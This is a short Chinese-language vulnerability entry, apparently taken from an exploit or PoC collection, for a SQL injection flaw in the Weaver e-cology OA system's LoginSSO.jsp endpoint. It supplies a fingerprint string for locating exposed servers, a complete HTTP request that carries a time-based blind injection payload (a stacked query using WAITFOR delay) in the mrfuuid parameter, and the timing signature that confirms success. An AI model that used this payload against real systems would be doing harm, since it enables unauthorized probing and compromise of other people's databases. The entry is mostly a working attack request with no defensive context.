# 泛微e-cologyFileDownloadLoginSSO存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`body="doCheckPopupBlocked"`
- **请求**：`GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mrfuuid=1%27;if+db_name(1)=%27master%27+WAITFOR+delay+%270:0:5%27--+&mailid=0&a=.swf HTTP/1.1`
- **响应特征**：200 响应时间>5s